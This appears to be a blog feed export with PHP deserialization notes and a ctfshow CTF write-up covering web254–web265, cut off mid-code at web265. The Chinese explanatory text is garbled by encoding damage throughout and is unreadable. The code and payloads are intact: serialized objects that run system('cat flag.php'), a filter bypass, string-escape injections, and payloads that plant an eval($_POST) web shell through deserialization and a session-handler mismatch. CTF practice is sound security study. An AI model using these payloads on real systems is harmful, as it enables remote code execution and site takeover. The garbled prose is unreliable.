        <content type="html"><![CDATA[<p>phpåœ¨sessionå­˜å‚¨å’Œè¯»å–æ—¶,éƒ½ä¼šæœ‰ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹,PHPå†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å–<code>$_SESSION</code>æ•°æ®,éƒ½ä¼šå¯¹æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–,æºç ä¸­æœ‰session_startçš„æ—¶å€™ä¼šè¯»å–session,ä»è€Œè¿›è¡Œååºåˆ—åŒ–.<br>php.ini ä¸­é»˜è®¤ session.serialize_handler ä¸º php_serializeï¼Œè€Œ index.php ä¸­å°†å…¶è®¾ç½®ä¸º php ï¼Œè¿™ä¸ªå·®å¼‚å°±å¯¼è‡´äº† sesssion ååºåˆ—åŒ–é—®é¢˜ã€‚</p><pre><code>php_binary: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼php: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼php_serialize(php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</code></pre><p>phpæœ‰ä¸‰ç§å¤„ç†å™¨å¯¹$_SESSIONæ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p>1ã€ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹ä¸ºä¸€ä¸ªå¯¹è±¡ï¼›</p><p>2ã€ååºåˆ—åŒ–ç”Ÿæˆçš„å¯¹è±¡é‡Œçš„å€¼ï¼Œç”±ååºåˆ—åŒ–é‡Œçš„å€¼æä¾›ï¼Œä¸åŸæœ‰ç±»é¢„å®šä¹‰çš„å€¼æ— å…³ï¼›</p><p>3ã€ååºåˆ—åŒ–ä¸è§¦å‘ç±»çš„æˆå‘˜æ–¹æ³•ï¼›éœ€è¦è°ƒç”¨æ–¹æ³•åæ‰èƒ½è§¦å‘ï¼›</p><p> å¸¸è§é­”æœ¯æ–¹æ³•ï¼š</p><img src="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/205313.png" class=""><p>é­”æœ¯æ–¹æ³•è§¦å‘å‰æï¼šé­”æœ¯æ–¹æ³•æ‰€åœ¨ç±»ï¼ˆæˆ–å¯¹è±¡ï¼‰è¢«è°ƒç”¨</p><table><thead><tr><th>å‡½æ•°</th><th>è§¦å‘æ—¶æœº</th></tr></thead><tbody><tr><td>__construct()</td><td>å®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šå»è‡ªåŠ¨æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•</td></tr><tr><td>__destruct()</td><td>åœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾ç¤ºé”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ï¼ˆå®ä¾‹åŒ–ç»“æŸåä»¥åŠååºåˆ—åŒ–æ—¶ä¼šè§¦å‘ï¼‰</td></tr><tr><td>__sleep()</td><td>åºåˆ—åŒ–serialize()å‡½æ•°å›æ˜¾æ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨__sleep()ï¼Œå¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</td></tr><tr><td>__wakeup()</td><td>unserialize()ä¹‹å‰ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª__wakeup()æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeup()æ–¹æ³•</td></tr><tr><td>__tostring()</td><td>è¡¨è¾¾æ–¹å¼é”™è¯¯å¯¼è‡´é­”æœ¯æ–¹æ³•è§¦å‘ï¼ˆæŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²è°ƒç”¨ï¼‰</td></tr><tr><td>__invoke()</td><td>æ ¼å¼è¡¨è¾¾é”™è¯¯å¯¼è‡´æ²¡é­”æœ¯æ–¹æ³•è§¦å‘ï¼ˆæŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨ï¼‰</td></tr><tr><td>__call()</td><td>è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°ï¼‰</td></tr><tr><td>__callStatic()</td><td>é™æ€è°ƒç”¨æˆ–è°ƒç”¨æˆå‘˜å¸¸é‡æ—¶ä½¿ç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°ï¼‰</td></tr><tr><td>__get()</td><td>è°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°ï¼‰</td></tr></tbody></table><table><thead><tr><th>å‡½æ•°</th><th>è§¦å‘æ—¶æœº</th></tr></thead><tbody><tr><td>__set()</td><td>ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°å’Œèµ‹çš„å€¼ï¼‰</td></tr><tr><td>__isset()</td><td>å¯¹ä¸å¯è®¿é—®å±æ€§(ç§æœ‰çš„ã€å—ä¿æŠ¤çš„æˆ–ä¸å­˜åœ¨çš„å±æ€§)ä½¿ç”¨isset()æˆ–empty()æ—¶ï¼Œ__isset()ä¼šè¢«è°ƒç”¨ ï¼ˆè¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°ï¼‰</td></tr><tr><td>__unset()</td><td>å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨unset()æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§åç§°ï¼‰</td></tr><tr><td>__clone()</td><td>å½“ä½¿ç”¨cloneå…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³•__clone()</td></tr><tr><td>__serialize()ï¼ˆæ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚ï¼‰</td><td>serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __serialize() ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•å°†åœ¨ä»»ä½•åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œã€‚å®ƒå¿…é¡»ä»¥ä¸€ä¸ªä»£è¡¨å¯¹è±¡åºåˆ—åŒ–å½¢å¼çš„ é”®&#x2F;å€¼ æˆå¯¹çš„å…³è”æ•°ç»„å½¢å¼æ¥è¿”å›ã€‚æ³¨ï¼šå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº†__serialize()å’Œ__sleep()ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰__seriallize()æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œ__sleep()æ–¹æ³•ä¼šè¢«å¿½ç•¥</td></tr><tr><td>__unserialize()ï¼ˆæ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚ï¼‰</td><td>unserialize()æ£€æŸ¥æ˜¯å¦å­˜åœ¨å…·æœ‰åä¸º__unserialize() çš„é­”æœ¯æ–¹æ³•ã€‚æ³¨ï¼šå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize() å’Œ __wakeup()ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup()æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–(ctfshow)</title>
      <link href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"/>
      <url>/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>è¿™å…³å¥½åƒå’Œååºåˆ—åŒ–æ²¡ä»€ä¹ˆå…³ç³»</p><pre><code>payload ?username=xxxxxx&amp;password=xxxxxx</code></pre><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223653.png" class=""><p>è¿™é‡Œè®©æˆ‘ä»¬è®©ååºåˆ—åçš„ç»“æœæ˜¯ctfShowUserçš„å®ä¾‹åŒ–å¯¹è±¡ã€‚åˆå› ä¸ºåªæœ‰$this-&gt;isVipæ˜¯trueæ‰èƒ½æ˜¯flagï¼Œæ‰€ä»¥ååºåˆ—åŒ–çš„å†…å®¹ä¸º</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());//O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;isVip&quot;;b:1;&#125;//ç”±äºcookieä¸­å°†;ä½œä¸ºæˆªæ–­ç¬¦å·ï¼Œæ‰€éœ€è¦ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œé‡‡ç”¨urlç¼–ç echo urlencode($a);//O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>è¿™å…³éœ€è¦åºåˆ—åŒ–ä¸€ä¸ªusernameæˆ–passwordä½¿å…¶ååºåˆ—åŒ–åäº’ä¸ç›¸åŒå°±è¡Œäº†</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $username=&#39;haha&#39;;    public $isVip=true;&#125;$a= serialize(new ctfShowUser());echo urlencode($a);?&gt;//è¿è¡Œç»“æœO:11:&quot;ctfShowUser&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;haha&quot;;s:5:&quot;isVip&quot;;b:1;&#125;//urlç¼–ç å¤„ç†åï¼šO%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22haha%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><p><code>__construct</code>å½“å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œå¯¹å¯¹è±¡è¿›è¡Œåˆå§‹åŒ–ã€‚å½“æ‰€æœ‰çš„æ“ä½œæ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œéœ€è¦é‡Šæ”¾åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè§¦å‘<code>__destruct()</code>é­”æœ¯æ–¹æ³•</p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨æ‰§è¡Œ<code>__construct</code>çš„æ—¶å€™åˆå§‹åŒ–backDoorç±»ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨ï¼Œä¹‹åååºåˆ—åŒ–ç»“æŸåï¼Œä¼šæ‰§è¡Œ<code>__destruct()</code>,æ­¤æ—¶<code>eval($this-&gt;code);</code>ç­‰ä»·äº<code>eval(system(&#39;cat flag.php&#39;);)</code></p><pre><code>&lt;?phperror_reporting(0);class ctfShowUser&#123;    private $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;    public function getInfo()&#123;        eval($code);    &#125;&#125;echo urlencode(serialize(new ctfShowUser()));?&gt;//è¦åœ¨è¾“å‡ºæ—¶å°±è¦urlç¼–ç ï¼Œå¦åˆ™ä¼šé—æ¼æ‰ç©ºæ ¼</code></pre><p>æœ€åç”Ÿæˆååºåˆ—åŒ–çš„æ•°æ®ï¼š</p><pre><code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</code></pre><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><p>è¿™å…³å¤šäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š<code>/[oc]:\d+:/i</code>ã€‚æ„æ€æ˜¯è¿‡æ»¤è¿™ä¸¤ç§æƒ…å†µï¼š<code>o:æ•°å­—:</code>ä¸<code>c:æ•°å­—:</code></p><p>åªéœ€è¦æŠŠOåé¢çš„æ•°å­—å‰åŠ ä¸ªåŠ å·å°±å¯ä»¥ç»•è¿‡äº†ï¼ˆo:+æ•°å­—:ï¼‰</p><pre><code>&lt;?phpclass ctfShowUser&#123;    public $class = &#39;backDoor&#39;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125; &#125; class backDoor&#123;    public $code=&#39;system(&quot;cat f*&quot;);&#39;;&#125;$a = serialize(new ctfShowUser());$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);echo urlencode($a);?&gt;//è¿è¡Œç»“æœO:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:17:&quot;system(&quot;cat f*&quot;);&quot;;&#125;&#125;//URLå¤„ç†O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</code></pre><h3 id="web259"><a href="#web259" class="headerlink" title="web259*"></a>web259*</h3><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p> è¿™é¢˜å°±ç®€å•äº†ï¼Œç›´æ¥åºåˆ—åŒ–ä¸€ä¸ªåŒ…å«â€ctfshow_i_love_36Dâ€çš„å­—ç¬¦ä¸²</p><pre><code>&lt;?phpclass ctf&#123;    public $c=&quot;ctfshow_i_love_36D&quot;;&#125;$a=serialize(new ctf());echo urlencode($a);</code></pre><pre><code>payload:ctfshow&#123;3d3ba94d-0c6c-4ae8-8113-b34d15d286b9&#125;</code></pre><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code>æ³¨æ„:å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize() å’Œ __wakeup() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚//æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</code></pre><p><code>__destruct</code> å‡½æ•°éƒ¨åˆ†å¼±æ¯”è¾ƒ <code>$this-&gt;code==0x36d</code>ï¼Œå› ä¸º <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>ï¼Œ<code>username</code> å¯æ§åˆ¶ï¼Œå› ä¸º <code>(int)&#39;877.php&#39; == 0x36d</code>ï¼Œæ•…ä¼  <code>877.php</code> å³å¯ç»•è¿‡ã€‚</p><pre><code>&lt;?phpclass ctfshowvip&#123;    public $username;    public $password=&#39;&#39;;    public $code=&#39;&#39;;            public function __construct()&#123;        $this-&gt;username=&#39;877.php&#39;;        $this-&gt;password=&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;                    &#125;    &#125;echo urlencode(serialize(new ctfshowvip()));?&gt;</code></pre><pre><code>payload: vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bs%3A0%3A%22%22%3B%7D</code></pre><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>æ–¹æ³•1ï¼šéé¢„æœŸ</p><p>å› ä¸ºmessage.phpé¡µé¢ä¸­çš„cookieæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†åºåˆ—åŒ–åŠ å¯†ä¹‹åçš„å­—ç¬¦ä¸²èµ‹å€¼ç»™cookieå³å¯ã€‚</p><pre><code>&lt;?php class message&#123;    public $token=&#39;admin&#39;;&#125;echo urlencode(base64_encode(serialize(new message(1,2,3))));</code></pre><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/223637.png" class=""><p>æ–¹æ³•2ï¼š<strong>phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong></p><pre><code>å­—ç¬¦ä¸²é€ƒé€¸ç±»ä¼¼äºæ³¨å…¥ï¼Œé€ƒé€¸æœ‰ä¸€ä¸ªç‰¹å¾ï¼šå¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ›¿æ¢ã€è€Œä¸”æ›¿æ¢åé€ æˆäº†å­—ç¬¦æ•°é‡çš„ä¸ä¸€è‡´ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯æ›¿æ¢åå˜é•¿ï¼Œä¸€ç§æ˜¯æ›¿æ¢åå˜çŸ­ã€‚æ­¤é¢˜å°†fuckæ›¿æ¢æˆäº†loveUï¼Œæ‰€ä»¥æ˜¯å˜é•¿ã€‚</code></pre><p>æˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªï¼š</p><pre><code>&lt;?phpclass message&#123;    public $from=&#39;1&#39;;    public $msg=&#39;2&#39;;    public $to=&#39;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;;&#125;echo urlencode(serialize(new message()));//ç»“æœè§£ç åä¸ºO:7:&quot;message&quot;:3:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„s:31:â€fuckâ€ä¸­fuckåº”è¯¥æ˜¯å››ä¸ªå­—ç¬¦ï¼Œè€Œè¿™é‡Œå´æ˜¯31ä¸ªï¼Œå› ä¸ºè¿™é‡Œçš„31ä¸ªå­—ç¬¦åŒ…å«äº†åé¢çš„ä¸€å †å­—ç¬¦<code>fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>ï¼Œå…±27ä¸ªå­—ç¬¦ï¼Œè€Œè¦ä½¿è¿™é‡Œçš„æ•°å­—äºå­—ç¬¦æ•°å¯¹åº”ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°é¢˜ç›®ç»™çš„å­—ç¬¦ä¸²æ›¿æ¢ï¼Œå°†fuckæ›¿æ¢æˆloveU,æ¯æ›¿æ¢ä¸€æ¬¡å°±ä¼šå¤šä¸€ä¸ªå­—ç¬¦ï¼Œä¸éš¾æƒ³åˆ°ï¼Œå¦‚æœæ›¿æ¢27æ¬¡ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºè¿™é‡Œå°†åé¢çš„å¸¸é‡å­—ç¬¦ä¸²æ•°é‡å¤©è¡£æ— ç¼çš„å¼¥è¡¥ä¸Šäº†ã€‚</p><pre><code>payload:f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>æœ€åè®¿é—®message.phpå³å¯</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>ç”¨æ‰«æå™¨æ‰«åˆ°äº†<a href="http://www.zipå’Œcheck.php/">www.zipå’Œcheck.php</a></p><p><a href="http://www.zipä¸­çš„index.php/">www.zipä¸­çš„index.php</a>:</p><img src="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/205319.png" class=""><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>$COOKIE[&#39;limit&#39;]</code> æ¥æ§åˆ¶ <code>session</code> çš„å†…å®¹ã€‚</p><p>inc&#x2F;inc.php:</p><pre><code>&lt;?php...ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();...class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status=$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;...</code></pre><p>æˆ‘ä»¬éœ€è¦çŸ¥é“session_start()è¿™ä¸ªå‡½æ•°å·²ç»è¿™ä¸ªå‡½æ•°æ‰€èµ·çš„ä½œç”¨ï¼š</p><p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†ä¹‹å¡«å……åˆ° $_SESSION è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚</p><p>è¿™é‡Œä½¿ç”¨ <code>ini_set</code> æŒ‡å®šäº† <code>serialize_handler</code> ä¸º <code>php</code>ï¼Œå¦‚æœé»˜è®¤çš„ <code>serialize_handler</code> ä¸º <code>php_serialize</code>ï¼Œå°±å¯ä»¥é€šè¿‡åœ¨åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¹‹å‰åŠ  <code>|</code>ï¼Œååºåˆ—åŒ–ä»»æ„å¯¹è±¡ã€‚</p><pre><code>php_binary: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼php: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼php_serialize(php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</code></pre><p>æ³¨æ„ï¼šåœ¨ <code>php 5.5.4</code> ä»¥å‰é»˜è®¤é€‰æ‹©çš„æ˜¯ <code>php</code>ï¼Œ<code>5.5.4</code> ä¹‹åå°±æ˜¯ <code>php_serialize</code>ï¼Œè¿™é‡Œçš„ <code>php</code> ç‰ˆæœ¬ä¸º <code>7.3.11</code>ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯ <code>php_serialize</code>ã€‚</p><p>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œé¦–å…ˆåœ¨ <code>$COOKIE[&#39;limit&#39;]</code> ä¸­æ„é€  <code>|+åºåˆ—åŒ–å¯¹è±¡</code> çš„å­—ç¬¦ä¸²ï¼Œè®¿é—®é¦–é¡µå†™å…¥ <code>session</code>ï¼Œå†é€šè¿‡ <code>check.php</code> åŠ è½½çš„ <code>inc.php</code> ä¸­çš„ <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> å°† <code>session</code> ä»¥ <code>session.serialize_handler=php</code> çš„æ ¼å¼ååºåˆ—åŒ–ï¼Œæ‰§è¡Œ <code>User</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•å†™ <code>shell</code>ã€‚</p><p>é¦–å…ˆæ„é€ payload:</p><pre><code>&lt;?phpclass User&#123;    public $username = &quot;c.php&quot;;    public $password = &quot;&lt;?php @eval($_POST[1]); ?&gt;&quot;;    public $status;&#125;$a = new User();$target = &#39;|&#39;.serialize($a);var_dump(urlencode(base64_encode($target)));//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJjLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4iO3M6Njoic3RhdHVzIjtOO30%3D</code></pre><p>æ›´æ”¹ <code>cookie</code> åè®¿é—® <code>index.php</code>,ç„¶åè®¿é—®check.phpæˆ–inc&#x2F;inc.phpè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åè®¿é—®log-c.phpä¼ å‚å³å¯</p><h3 id="web264-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#web264-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="web264 ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>web264 ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h3><p>ä¸262å…³ä¸åŒçš„æ˜¯è¿™é‡Œç”¨çš„æ˜¯sessionï¼Œæ‰€ä»¥ä¸èƒ½éé¢„æœŸäº†</p><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼š</p><pre><code>f=1&amp;m=2&amp;t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>è®¿é—®message.phpæ—¶è¿˜éœ€è¦åœ¨cookieä¸­æ·»åŠ msgï¼Œå€¼ä»»æ„</p><h3 id="web265-ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨"><a href="#web265-ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨" class="headerlink" title="web265 ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨"></a>web265 ååºåˆ—åŒ–ä¸­æŒ‡é’ˆå¼•ç”¨</h3><p>tokençš„å€¼æ˜¯ä¸€ä¸ªéšæœºå€¼ï¼Œæˆ‘ä»¬è¦æƒ³ä¼ å€¼ç»™passwordï¼Œä½¿å…¶ä¸tokenç›¸ç­‰æ˜¯ä¸å¯èƒ½çš„ï¼Œé‚£ä¹ˆå°±åªæœ‰æŠŠpasswordçš„åœ°å€ä¼ ç»™tokenï¼Œä½¿passwordè·Ÿç€tokençš„æ”¹å˜è€Œæ”¹å˜ã€‚</p><pre><code>&lt;?phpclass ctfshowAdmin&#123;    public $token=1;    public $password=1;&#125;$a = new ctfshowAdmin();$a-&gt;password=&amp;$a-&gt;token;//è®©passwdçš„å€¼éštokenå˜echo 